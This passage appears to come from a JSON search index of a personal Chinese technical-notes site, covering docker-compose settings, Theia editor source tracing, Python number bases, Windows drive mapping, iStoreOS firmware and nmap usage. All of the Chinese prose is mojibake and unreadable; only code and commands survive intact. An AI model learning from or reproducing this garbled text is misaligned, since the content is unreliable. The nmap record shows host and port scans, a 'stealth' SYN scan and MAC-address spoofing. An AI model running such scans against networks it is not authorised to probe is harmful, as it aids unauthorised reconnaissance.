æœåŠ¡çš„æ—¥å¿—è®°å½•é…ç½® driver æŒ‡å®šæœåŠ¡å®¹å™¨çš„æ—¥å¿—è®°å½•é©±åŠ¨ç¨‹åºï¼Œé»˜è®¤å€¼ä¸ºjson-fileã€‚æœ‰ä»¥ä¸‹ä¸‰ä¸ªé€‰é¡¹ driver: \"json-file\" driver: \"syslog\" driver: \"none\" ä»…åœ¨ json-file é©±åŠ¨ç¨‹åºä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°ï¼Œé™åˆ¶æ—¥å¿—å¾—æ•°é‡å’Œå¤§å°: logging: driver: json-file options: max-size: \"200k\" # å•ä¸ªæ–‡ä»¶å¤§å°ä¸º200k max-file: \"10\" # æœ€å¤š10ä¸ªæ–‡ä»¶ å½“è¾¾åˆ°æ–‡ä»¶é™åˆ¶ä¸Šé™ï¼Œä¼šè‡ªåŠ¨åˆ é™¤æ—§å¾—æ–‡ä»¶ã€‚ syslog é©±åŠ¨ç¨‹åºä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ syslog-address æŒ‡å®šæ—¥å¿—æ¥æ”¶åœ°å€: logging: driver: syslog options: syslog-address: \"tcp://192.168.0.42:123\" network_mode è®¾ç½®ç½‘ç»œæ¨¡å¼: network_mode: \"bridge\" network_mode: \"host\" network_mode: \"none\" network_mode: \"service:[service name]\" network_mode: \"container:[container name/id]\" networks é…ç½®å®¹å™¨è¿æ¥çš„ç½‘ç»œï¼Œå¼•ç”¨é¡¶çº§ networks ä¸‹çš„æ¡ç›® services: some-service: networks: some-network: aliases: - alias1 other-network: aliases: - alias2 networks: some-network: # Use a custom driver driver: custom-driver-1 other-network: # Use a custom driver which takes special options driver: custom-driver-2 aliases ï¼šåŒä¸€ç½‘ç»œä¸Šçš„å…¶ä»–å®¹å™¨å¯ä»¥ä½¿ç”¨æœåŠ¡åç§°æˆ–æ­¤åˆ«åæ¥è¿æ¥åˆ°å¯¹åº”å®¹å™¨çš„æœåŠ¡ã€‚ restart noï¼šæ˜¯é»˜è®¤çš„é‡å¯ç­–ç•¥ï¼Œåœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šé‡å¯å®¹å™¨ã€‚ alwaysï¼šå®¹å™¨æ€»æ˜¯é‡æ–°å¯åŠ¨ã€‚ on-failureï¼šåœ¨å®¹å™¨éæ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€é0ï¼‰ï¼Œæ‰ä¼šé‡å¯å®¹å™¨ã€‚ unless-stoppedï¼šåœ¨å®¹å™¨é€€å‡ºæ—¶æ€»æ˜¯é‡å¯å®¹å™¨ï¼Œä½†æ˜¯ä¸è€ƒè™‘åœ¨Dockerå®ˆæŠ¤è¿›ç¨‹å¯åŠ¨æ—¶å°±å·²ç»åœæ­¢äº†çš„å®¹å™¨ å¦‚: restart: \"no\" restart: always restart: on-failure restart: unless-stopped æ³¨ï¼šswarm é›†ç¾¤æ¨¡å¼ï¼Œè¯·æ”¹ç”¨ restart_policyã€‚ secrets å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç : version: \"3.1\" services: mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/my_secret secrets: - my_secret secrets: my_secret: file: ./my_secret.txt security_opt ä¿®æ”¹å®¹å™¨é»˜è®¤çš„ schema æ ‡ç­¾: security-optï¼š - label:user:USER # è®¾ç½®å®¹å™¨çš„ç”¨æˆ·æ ‡ç­¾ - label:role:ROLE # è®¾ç½®å®¹å™¨çš„è§’è‰²æ ‡ç­¾ - label:type:TYPE # è®¾ç½®å®¹å™¨çš„å®‰å…¨ç­–ç•¥æ ‡ç­¾ - label:level:LEVEL # è®¾ç½®å®¹å™¨çš„å®‰å…¨ç­‰çº§æ ‡ç­¾ stop_grace_period æŒ‡å®šåœ¨å®¹å™¨æ— æ³•å¤„ç† SIGTERM (æˆ–è€…ä»»ä½• stop_signal çš„ä¿¡å·)ï¼Œç­‰å¾…å¤šä¹…åå‘é€ SIGKILL ä¿¡å·å…³é—­å®¹å™¨: stop_grace_period: 1s # ç­‰å¾… 1 ç§’ stop_grace_period: 1m30s # ç­‰å¾… 1 åˆ† 30 ç§’ é»˜è®¤çš„ç­‰å¾…æ—¶é—´æ˜¯ 10 ç§’ã€‚ stop_signal è®¾ç½®åœæ­¢å®¹å™¨çš„æ›¿ä»£ä¿¡å·ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ SIGTERM ã€‚ ä»¥ä¸‹ç¤ºä¾‹ï¼Œä½¿ç”¨ SIGUSR1 æ›¿ä»£ä¿¡å· SIGTERM æ¥åœæ­¢å®¹å™¨: stop_signal: SIGUSR1 sysctls è®¾ç½®å®¹å™¨ä¸­çš„å†…æ ¸å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„æˆ–å­—å…¸æ ¼å¼: sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0 sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 tmpfs åœ¨å®¹å™¨å†…å®‰è£…ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿã€‚å¯ä»¥æ˜¯å•ä¸ªå€¼æˆ–åˆ—è¡¨çš„å¤šä¸ªå€¼: tmpfs: /run tmpfs: - /run - /tmp ulimits è¦†ç›–å®¹å™¨é»˜è®¤çš„ ulimit: ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes å°†ä¸»æœºçš„æ•°æ®å·æˆ–ç€æ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨é‡Œ: version: \"3.7\" services: db: image: postgres:latest volumes: - \"/localhost/postgres.sock:/var/run/postgres/postgres.sock\" - \"/localhost/data:/var/lib/postgresql/data\" å‚è€ƒ: èœé¸Ÿæ•™ç¨‹","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-compose.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-compose.html"},{"title":"èµ„æºç®¡ç†å™¨å·¥ä½œåŒºæŒ‰é’®","text":"node_modules/@theia/workspace/src/browser/workspace-commands.ts çš„ WorkspaceCommands åŸºæœ¬ä¸Šå®šä¹‰å®Œäº† è§¦å‘å®šä¹‰åœ¨ WorkspaceCommandContribution","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html"},{"title":"å·¥å…·æ æ›´å¤š","text":"èµ„æºç®¡ç†å™¨çš„å·¥å…·æ çš„æ›´å¤š node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx çš„ TabBarToolbar ä¸‹çš„ registerMoreToolbarItem : // More (...) toolbar items. this.registerMoreToolbarItem({ id: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id, command: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id, tooltip: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.label, group: NavigatorMoreToolbarGroups.TOOLS, }); this.registerMoreToolbarItem({ id: WorkspaceCommands.ADD_FOLDER.id, command: WorkspaceCommands.ADD_FOLDER.id, tooltip: WorkspaceCommands.ADD_FOLDER.label, group: NavigatorMoreToolbarGroups.WORKSPACE, }); é‚£ä¸‰ä¸ªç‚¹å®ç°åœ¨ node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx çš„ TabBarToolbar ä¸‹ renderMore : protected renderMore(): React.ReactNode { return !!this.more.size && <div key='__more__' className={TabBarToolbar.Styles.TAB_BAR_TOOLBAR_ITEM + ' enabled'}> <div id='__more__' className={codicon('ellipsis', true)} onClick={this.showMoreContextMenu} title={nls.localizeByDefault('More Actions...')} /> </div>; }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html"},{"title":"Pythonä¸­è¿›åˆ¶","text":"å…³é”®å­— Pythonè¿›åˆ¶, pythonè¿›åˆ¶, è¿›åˆ¶è½¬æ¢, è·å–è¿›åˆ¶æ•° ä¸€èˆ¬æœ‰ä¸‰ç§: bin äºŒè¿›åˆ¶ oct å…«è¿›åˆ¶ hex åå…­è¿›åˆ¶ å…¶ä¸­ å…«è¿›åˆ¶ 0 å¼€å¤´ åå…­è¿›åˆ¶ 0x å¼€å¤´ è½¬æ¢ nè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå‡è®¾éœ€è¦è½¬æ¢çš„ä½strçš„æ•°å­—å­—ç¬¦ä¸²: # str=001234; n=8 print int(str, n) è¿›åˆ¶è½¬æ¢ pythonä¸­çº¦å®šäº†ä»¥ä¸º 0b, 0o, 0xå¼€å¤´, b, o, x çš„å«ä¹‰åˆ†åˆ«æ˜¯: b - äºŒè¿›åˆ¶,Binary o - å…«è¿›åˆ¶,Octal x - åå…­è¿›åˆ¶,Hexadecimal åœ¨Pythonä¸­å¯¹åº”æ–¹æ³•ä¸º: äºŒè¿›åˆ¶: bin() å…«è¿›åˆ¶: oct() åå…­è¿›åˆ¶: hex() è½¬å›åè¿›åˆ¶: int('0x16', 16) ä¸¾ä¸ªä¾‹å­: 0b10 # äºŒè¿›åˆ¶ 10, ç›¸å½“äºåè¿›åˆ¶ 2 0o10 # å…«è¿›åˆ¶ 10, ç›¸å½“äºåè¿›åˆ¶ 8 0x10 # åå…­è¿›åˆ¶ 10, ç›¸å½“äºåè¿›åˆ¶ 16 ä¾‹: In [6]: 'åè¿›åˆ¶', 22 Out[6]: ('åè¿›åˆ¶', 22) In [7]: 'äºŒè¿›åˆ¶', bin(22) Out[7]: ('äºŒè¿›åˆ¶', '0b10110') In [8]: 'å…«è¿›åˆ¶', oct(22) Out[8]: ('å…«è¿›åˆ¶', '0o26') In [9]: 'åå…­è¿›åˆ¶', hex(22) Out[9]: ('åå…­è¿›åˆ¶', '0x16') In [11]: int('0x16', 16), 'åå…­è¿›åˆ¶è½¬åè¿›åˆ¶' Out[11]: (22, 'åå…­è¿›åˆ¶è½¬åè¿›åˆ¶')","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-midfielder.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-midfielder.html"},{"title":"nmap","text":"Network Mapper, Linuxä¸‹çš„ç½‘ç»œæ‰«æå’Œå—…æ¢å·¥å…·åŒ…(æ¯”å¦‚IP/ç«¯å£æ‰«æ) ç”¨æ³•: nmap [Scan Type(s)] [Options] {target specification} targetå¯ä»¥æ˜¯å•ä¸€ IP, æˆ–ä¸»æœºåï¼Œæˆ–åŸŸåï¼Œæˆ–å­ç½‘ é€‰é¡¹å‚æ•° --interactive æ‰“å¼€äº¤äº’æ¨¡å¼ -v è¾“å‡ºè¯¦ç»†ä¿¡æ¯ -O å°è¯•è¯†åˆ«è¿œç¨‹æ“ä½œç³»ç»Ÿ -s S TCP SYN æ‰«æ (åˆç§°åŠå¼€æ”¾,æˆ–éšèº«æ‰«æ) -s V æ‰“å¼€ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹ -A åŒæ—¶æ‰“å¼€æ“ä½œç³»ç»ŸæŒ‡çº¹å’Œç‰ˆæœ¬æ£€æµ‹ -s n , -s P ä¸æ‰«æç«¯å£, å‘é€imcpå’Œä¸€ä¸ªTCPæŠ¥æ–‡åˆ°80ç«¯å£ å…¶ä»–: -P0 å…è®¸ä½ å…³é—­ ICMP pings. -Pn æ— ping, è·³è¿‡ä¸»æœºå‘ç°é˜¶æ®µï¼ŒæŠŠæ¯ä¸ªéƒ½IPå½“æˆå­˜æ´»ä¸»æœº -P0 <åè®®å·åˆ—è¡¨> IP åè®® ping, -sT TCP connect()æ‰«æ -sU UDP æ‰«æ ç¤ºä¾‹ æ‰«æå±€åŸŸç½‘ä¸»æœº: nmap -sP 192.168.1.0/24 æ‰«æä¸»æœºç«¯å£: nmap -sT 192.168.1.101 # è²Œä¼¼å…¶ä»–éKaliæœºå™¨è‡ªè¡Œå®‰è£…çš„å¾— nmap -sT -Pn 192.168.1.101 åŒ¿åæ‰«æ: nmap -sS 192.168.1.101 â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$ nmap 192 .168.179.129 Starting Nmap 7 .93 ( https://nmap.org ) at 2023 -01-02 17 :24 CST Nmap scan report for 192 .168.179.129 Host is up ( 0 .000042s latency ) . Not shown: 999 closed tcp ports ( conn-refused ) PORT STATE SERVICE 22 /tcp open ssh Nmap done : 1 IP address ( 1 host up ) scanned in 0 .09 seconds â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$ æŸ¥çœ‹ 192.168.179.129 çš„ 22 ç«¯å£çŠ¶æ€: â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ nmap -p22 192.168.179.129 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 06:48 UTC Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds ä¼ªè£…MACåœ°å€11:11:11:11:11:11 â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ nmap --spoof-mac 11:11:11:11:11:11 192.168.100.1 -Pn -p 80 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:35 UTC Spoofing MAC address 11:11:11:11:11:11 (Private) You have specified some options that require raw socket access. These options will not be honored without the necessary privileges. Nmap scan report for 192.168.100.1 Host is up. PORT STATE SERVICE 80/tcp filtered http Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html"},{"title":"ç¼–è¾‘å™¨æ‰“å¼€å¹¶æ»‘åŠ¨","text":"ä¸»è¦åŸºäºçš„æƒ…å†µ: ä»£ç è·³è½¬åˆ°æŒ‡å®šæ–‡ä»¶çš„æŒ‡å®šä½ç½® å…¥å£ä½ç½®: node_modules/@theia/monaco-editor-core/src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts ä¸‹çš„ SymbolNavigationAction ç±» runEditorCommand , å…³é”®æ‰“å¼€å®é™…è§¦å‘çš„ _openReference å®ä¾‹æ–¹æ³•, å…³é”®ä»£ç : const targetEditor = await editorService.openCodeEditor({ resource: reference.uri, options: { selection: Range.collapseToStart(range), selectionRevealType: TextEditorSelectionRevealType.NearTopIfOutsideViewport, selectionSource: TextEditorSelectionSource.JUMP } }, editor, sideBySide); è¿™é‡Œè°ƒç”¨ editorService.openCodeEditor , å®šä¹‰åœ¨ node_modules/@theia/monaco/src/browser/monaco-editor-service.ts ä¸‹çš„ MonacoEditorService æœåŠ¡, openCodeEditor å…³é”®ä»£ç : override async openCodeEditor(input: IResourceEditorInput, source: ICodeEditor | null, sideBySide?: boolean): Promise<ICodeEditor | null> { const uri = new URI(input.resource.toString()); const openerOptions = this.createEditorOpenerOptions(input, source, sideBySide); const widget = await open(this.openerService, uri, openerOptions); ... } ä¸»è¦æ˜¯ open , å®šä¹‰åœ¨ node_modules/@theia/core/src/browser/opener-service.ts export async function open(openerService: OpenerService, uri: URI, options?: OpenerOptions): Promise<object | undefined> { const opener = await openerService.getOpener(uri, options); return opener.open(uri, options); } è¿™é‡Œåˆå›è½¬åˆ° node_modules/@theia/editor/src/browser/editor-manager.ts ä¸‹ EditorManager æœåŠ¡çš„: override open(uri: URI, options?: EditorOpenerOptions): Promise<EditorWidget> { ... return super.open(uri, { counter, ...options }); ... è¿™é‡Œsuperè§¦å‘çš„æ˜¯ node_modules/@theia/core/src/browser/widget-open-handler.ts ä¸‹çš„ WidgetOpenHandler æœåŠ¡çš„ async open(uri: URI, options?: WidgetOpenerOptions): Promise<W> { const widget = await this.getOrCreateWidget(uri, options); await this.doOpen(widget, options); return widget; } ä½†æ˜¯å®é™…ä¸Šæ˜¯è¢« node_modules/@theia/editor-preview/src/browser/editor-preview-manager.ts é‡å†™çš„ EditorPreviewManager è§¦å‘ tryGetPendingWidget : protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined { return super.tryGetPendingWidget(uri, { ...options, preview: true }) ?? super.tryGetPendingWidget(uri, { ...options, preview: false }); } å†çœ‹superçš„å®šä¹‰: protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined { const editorPromise = super.tryGetPendingWidget(uri, options); if (editorPromise) { // Reveal selection before attachment to manage nav stack. (https://github.com/eclipse-theia/theia/issues/8955) if (!(editorPromise instanceof Widget)) { editorPromise.then(editor => this.revealSelection(editor, options, uri)); } else { this.revealSelection(editorPromise, options); } } return editorPromise; } editorPromise é‚£ä¸€æ­¥å…¶å®å°±å¯ä»¥ç®—é¡µé¢å·²ç»åœ¨åå°åˆ›å»ºå¥½äº†, åªæ˜¯è¿˜æ²¡æ˜¾ç¤ºå‡ºæ¥è€Œå·². æ¥ç€é‡ç‚¹å°±æ˜¯è°ƒç”¨ revealSelection æ¥å°†å…‰æ ‡ç§»åŠ¨é“æŒ‡å®šçš„ä½ç½®, å…³é”®è°ƒç”¨ä»£ç : if (inputSelection) { const editor = widget.editor; const selection = this.getSelection(widget, inputSelection); if (Position.is(selection)) { editor.cursor = selection; editor.revealPosition(selection); } else if (Range.is(selection)) { editor.cursor = selection.end; editor.selection = selection; editor.revealRange(selection); } } ä»£ç è·³è½¬è§¦å‘çš„æ˜¯ revealRange , è¿™æœŸé—´ç®€å•çš„è°ƒç”¨æ‰“æ–­ç‚¹å‘ä¸‹çœ‹å°±æ˜¯äº†, å¤§è‡´é¡ºåº: node_modules/@theia/monaco/src/browser/monaco-editor.ts ä¸‹ MonacoEditor().revealRange , æ¥ä¸‹æ¥ä»¥è°ƒç”¨ revealRangeInCenter ä¸ºä¾‹ node_modules/@theia/monaco-editor-core/src/vs/editor/browser/widget/codeEditorWidget.ts , CodeEditorWidget().revealRangeInCenter åœ¨è¿™ä¸ªç±»ä¸­æœ€ç»ˆè§¦å‘: this._modelData.viewModel.revealRange('api', revealHorizontal, viewRange, verticalType, scrollType); å®ƒçš„ _withViewEventsCollector ä¼šå°†äº‹ä»¶æ”¾åˆ°ä¸€ä¸ªé›†åˆç„¶åç»Ÿä¸€è§¦å‘. ç¨å¾®å¤æ‚çš„å°±æ˜¯è¿™ä¸ªä½ç½®, å†™çš„æœ‰ç‚¹ç»•. é›†åˆç»Ÿä¸€å¤„ç†çš„ä½ç½®: node_modules/@theia/monaco-editor-core/src/vs/editor/common/viewEventHandler.ts ä¸‹çš„ ViewEventHandler().handleEvents , å…³é”®ä»£ç : case viewEvents.ViewEventType.ViewRevealRangeRequest: if (this.onRevealRangeRequest(e)) { shouldRender = true; } break; è¿™é‡Œ onRevealRangeRequest è§¦å‘çš„ç›¸å…³ä½ç½®ä¸º node_modules/@theia/monaco-editor-core/src/vs/editor/browser/viewParts/lines/viewLines.ts çš„ ViewLines().onRevealRangeRequest : const scrollTopDelta = Math.abs(this._context.viewLayout.getCurrentScrollTop() - newScrollPosition.scrollTop); const scrollType = (scrollTopDelta <= this._lineHeight ? ScrollType.Immediate : e.scrollType); this._context.viewModel.viewLayout.setScrollPosition(newScrollPosition, scrollType);","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html"},{"title":"net","text":"æŸ¥çœ‹å·²ç»æŒ‚è½½/æ‰“å¼€çš„ç½‘ç»œåœ°å€ (æŒ‡ç£ç›˜, ftpæœåŠ¡å™¨å•¥çš„): net use åˆ é™¤ä¸Šé¢åˆ—ä¸¾å‡ºæ‰€æœ‰æŒ‚è½½çš„ç£ç›˜/æœåŠ¡å™¨: net use /delete * åˆ é™¤ z ç›˜æ˜ å°„: net use z: /delete æŒ‚è½½sambaå…±äº«ä¸ºzç›˜: net use z:\\\\192.168.1.1\\USB_discl /user:usernane passwd","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-net.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-net.html"},{"title":"iStoreOS","text":"ä¸€ä¸ªåŸºäº /docs/æ“ä½œç³»ç»Ÿ/linux/OpenWrt/index çš„å®šåˆ¶ç³»ç»Ÿ å®˜ç½‘: https://www.istoreos.com å®˜ç½‘æ–‡æ¡£: https://doc.linkease.com/zh/guide/istoreos/ githubä¸»é¡µ: https://github.com/istoreos æ”¯æŒ(æºäºå®˜ç½‘) StoreOS å›ºä»¶ iStoreOS ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªäººäººä¼šç”¨çš„è·¯ç”±å…¼è½» NAS ç³»ç»Ÿï¼Œä¸ç®¡æ˜¯ä½œä¸ºè·¯ç”±è¿˜æ˜¯ NASï¼Œä½ éƒ½æœ‰ç›¸ä¼¼çš„æ“ä½œä½“éªŒã€‚ ç³»ç»Ÿæœ¬èº«å¼€æºå…è´¹ï¼Œç›®å‰ç³»ç»Ÿä»£ç å¼€æºåœ¨ï¼šGithub iStoreOS iStoreOS æ¥æºäº OpenWRTï¼Œç›¸è¾ƒäºåŸç‰ˆ OpenWRTï¼ŒiStoreOS å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š iStoreOS æä¾›äº†è½¯ä»¶ä¸­å¿ƒï¼šiStoreï¼Œå°½å¯èƒ½è§£å†³æ’ä»¶ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯è®©å¤§å®¶è‡ªç”±è‡ªåœ¨å®‰è£…æ’ä»¶ã€‚æ‰‹åŠ¨å®‰è£…ç¦»çº¿åŒ…ä¹Ÿæ˜¯æ”¯æŒçš„ã€‚ iStoreOS å›ºä»¶å‡çº§æ—¶ä¼šä¿ç•™ç”¨æˆ·å®‰è£…çš„æ’ä»¶ï¼Œé¿å…å‡çº§ä»¥åè¿˜è¦å†å®‰è£…ä¸€éæ’ä»¶ã€‚ iStoreOS å®˜æ–¹æ”¯æŒçš„ç¡¬ä»¶éƒ½å¯ä»¥åœ¨çº¿å‡çº§ï¼Œæ— éœ€æ‰‹åŠ¨ä¸‹è½½å›ºä»¶å‡çº§ã€‚ iStoreOS æ‹¥æœ‰æ²™ç®±æ¨¡å¼ã€‚é€šè¿‡ U ç›˜è¿›å…¥æ²™ç®±æ¨¡å¼ï¼Œåç»­çš„è½¯ä»¶å®‰è£…æ›´æ–°ä»¥åŠç³»ç»Ÿé…ç½®éƒ½åœ¨æ²™ç®±è¿›è¡Œã€‚ä¸ç®¡å®‰è£…æ’ä»¶æåäº†ç³»ç»Ÿè¿˜æ˜¯é…ç½®é”™è¯¯å¯¼è‡´ç³»ç»Ÿæ•…éšœï¼Œæ‹”æ‰ U ç›˜å°±å›åˆ°è¿›æ²™ç®±å‰çš„çŠ¶æ€ã€‚å¦‚æœå¯¹å½“å‰çŠ¶æ€æ»¡æ„è¿˜å¯ä»¥å›å†™åˆ°éæ²™ç®±ç¯å¢ƒã€‚æ²™ç®±æ¨¡å¼æœ¬èº«ä¹Ÿæ˜¯ç³»ç»Ÿæ‰©å®¹çš„æœ€ç®€å•çš„æ–¹æ³•ã€‚ æ•‘æ´æ¨¡å¼ï¼Œå³ä½¿å›ºä»¶æŸåï¼Œä¹Ÿå¯ä»¥è¿›å…¥æ•‘æ´æ¨¡å¼åˆ·æœºæˆ–æ¢å¤å‡ºå‚è®¾ç½®ã€‚ç›®å‰ä»…ä»…è‡ªå®¶ç¡¬ä»¶ ARS2 æ”¯æŒ æ”¯æŒä¸‰ç§ä¸åŒUI iStoreOS å…¥é—¨æå®¢ç‰ˆæœ¬ UI æ˜¯é»˜è®¤çš„ UIï¼Œç›®æ ‡æ˜¯æä¾›ç»™æ‡‚ç‚¹æŠ€æœ¯çš„å…¥é—¨æå®¢çˆ±å¥½è€…ï¼Œæˆ–è€…å·æ‡’æå®¢è€æ‰‹ï¼Œæ ¸å¿ƒç‰¹æ€§ï¼š é¦–é¡µæä¾›ç½‘ç»œå‘å¯¼ï¼Œç£ç›˜å‘å¯¼ï¼ŒDocker å‘å¯¼ç­‰ç­‰ä¼—å¤šå‘å¯¼ï¼Œä¸ç®¡æ˜¯æ–°æ‰‹è¿˜æ˜¯è€æ‰‹ï¼Œéƒ½èƒ½å¿«é€Ÿé…ç½®è‡ªå·±æƒ³è¦çš„ä¸œè¥¿ ä¿®å¤ä¼—å¤š OpenWRT ä¸äººæ€§çš„å°é—®é¢˜ï¼Œæ¯”å¦‚ Samba è®¾ç½®ç‹¬ç«‹ç”¨æˆ·åå¯†ç å¾ˆéº»çƒ¦ï¼Œç£ç›˜æŒ‚è½½ç­‰ æ›´å¤šé¦–é¡µå·¥å…·å¥½å¸®æ‰‹ï¼Œæ¯”å¦‚åœ¨çº¿å‡çº§ï¼Œå„ç§é”™è¯¯æ£€æµ‹ï¼Œç½‘å£å›¾å½¢åŒ–é…ç½®ç­‰ å…¶å®ƒå¾ˆå¤šå¸¸ç”¨çš„ï¼Œæ¯”å¦‚ DDNS é…ç½®ï¼ŒDocker é…ç½®ç­‰ æœ€æ ‡å‡†çš„å°ç™½è·¯ç”±ç‰ˆæœ¬ å‡å»äº†è¶…å¤šçš„å¤æ‚çš„çœ¼èŠ±ç¼­ä¹±çš„åŠŸèƒ½ï¼Œå›å½’æœ€æœ¬è´¨çš„è·¯ç”±åŠŸèƒ½ã€‚ å¯¹äºè·¯ç”±å™¨ç¡¬ä»¶å–å®¶æ¥è¯´ï¼Œæœ€å¥½é»˜è®¤å¸®ç”¨æˆ·å®‰è£…æ­¤ç‰ˆæœ¬ã€‚ å®‰è£…æ–¹æ³• åœ¨é»˜è®¤çš„æå®¢ç‰ˆæœ¬ä¸Šï¼Œä»è½¯ä»¶ä¸­å¿ƒï¼Œå®‰è£… iStoreX é€€å‡ºé‡æ–°ç™»å½•ï¼Œå°±åˆ°äº†å°ç™½è·¯ç”±å™¨ç‰ˆæœ¬ è½» NAS ç‰ˆæœ¬ å¦‚æœä½ ä¸æ˜¯é‡åº¦çš„BTä¸‹è½½ç”¨æˆ·ï¼Œä¹Ÿä¸æ˜¯é‡åº¦åœ¨çº¿çœ‹ç”µå½±éœ€è¦è§†é¢‘ç¡¬è§£ç çš„ç”¨æˆ·ï¼Œ é‚£ä¹ˆç”¨ä¸ªè½¯è·¯ç”±å½“NASï¼Œæ˜¯å®Œå…¨æ²¡é—®é¢˜çš„ã€‚æ¯•ç«Ÿç½‘ç»œè½¬å‘è·Ÿç¡¬ç›˜å­˜å‚¨ä¸å†²çªã€‚ å½“ç„¶ï¼ŒiStoreOS ä¹Ÿä¼šæä¾›ç»™ä½ ä¸€ä¸ªçº¯æ­£ç‹¬ç«‹çš„ NAS ç³»ç»Ÿï¼Œåº•å±‚ä¹Ÿå®Œå…¨æ˜¯ OpenWRTï¼Œ ä¸”è½¯ä»¶ä¸­å¿ƒå®Œå…¨äº’é€šï¼Œä½ æ‡‚çš„è·¯ç”±å™¨çš„çŸ¥è¯†ï¼Œä¹Ÿå¯ä»¥å®Œå…¨æ¬åˆ° NAS ç³»ç»Ÿä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ NAS ç³»ç»Ÿæœ‰å“ªäº›åŠŸèƒ½ï¼Ÿ RAID ç£ç›˜é˜µåˆ— S.M.A.R.T æ£€æµ‹ ä¸ªäººç§æœ‰ç½‘ç›˜ï¼Œå€ŸåŠ©æ˜“æœ‰äº‘æ’ä»¶ å®ç° ç›¸å†Œè‡ªåŠ¨å¤‡ä»½ï¼Œå€ŸåŠ©æ˜“æœ‰äº‘æ’ä»¶ å®ç° å¼‚åœ°å¤šè®¾å¤‡æ–‡ä»¶åŒæ­¥ï¼Œå€ŸåŠ©æ˜“æœ‰äº‘æ’ä»¶ å®ç° å¼‚åœ°ç»„ç½‘ï¼Œå€ŸåŠ©æ˜“æœ‰äº‘æ’ä»¶ å®ç° è¿œç¨‹åŸŸåè®¿é—®ï¼Œå€ŸåŠ©DDNSTOæ’ä»¶ å®ç° è½¯ä»¶ä¸­å¿ƒï¼ˆå½“ç„¶è½¯ä»¶ä¸­å¿ƒæœ‰ NasToolã€Jellyfin å½±é™¢ã€ä¸‹è½½ç­‰ç­‰ï¼‰ æ³¨æ„ï¼šç›®å‰æ­¤äº¤äº’è¿˜åœ¨æ´»è·ƒå¼€å‘ä¸­ å›ºä»¶ä¸‹è½½ ä¸‹è½½åœ°å€ https://fw.koolcenter.com/iStoreOS/ ä½¿ç”¨æ–¹æ³• é»˜è®¤IP: http://192.168.100.1 é»˜è®¤å¯†ç : password å¦‚æœåªæœ‰ä¸€ä¸ªç½‘å£ï¼Œé»˜è®¤çš„ç½‘å£æ˜¯ LANï¼› å¦‚æœå¤§äºä¸€ä¸ªç½‘å£ï¼Œé»˜è®¤ eth0 æ˜¯ WAN å£ï¼Œå…¶å®ƒéƒ½æ˜¯ LANã€‚ å¦‚æœåœ¨ LAN å£ä¿®æ”¹ IPï¼Œæˆ–è€…ä»»ä½•ä¿®æ”¹ä¹‹åå¯¼è‡´æ— æ³•è¿æ¥è·¯ç”±å™¨ï¼Œéƒ½ä¼šå¯¼è‡´åˆšæ‰çš„ä¿®æ”¹è¢«å›æ»šã€‚ æ‰€ä»¥è¦ä¿®æ”¹ 